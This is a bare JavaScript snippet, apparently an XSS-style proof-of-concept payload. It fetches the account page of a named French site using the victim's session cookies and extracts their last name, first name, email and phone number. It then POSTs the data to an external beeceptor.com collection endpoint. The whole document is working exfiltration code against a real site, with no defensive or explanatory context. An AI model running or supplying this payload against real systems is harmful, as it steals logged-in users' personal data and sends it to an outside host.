fetch('https://ac.cfi.fr/fr/compte/', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    const fields = ['last_name', 'first_name', 'email', 'phone'];
    const data = {};
    fields.forEach(id => {
      const el = doc.getElementById(id);
      data[id] = el ? el.value : null;
    });
    console.log('Datos extraídos:', data);
    return fetch('https://sdsdf.free.beeceptor.com', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    });
  })
  .then(r => r.json())
  .then(res => console.log('Respuesta POST:', res))
  .catch(err => console.error('Error:', err));
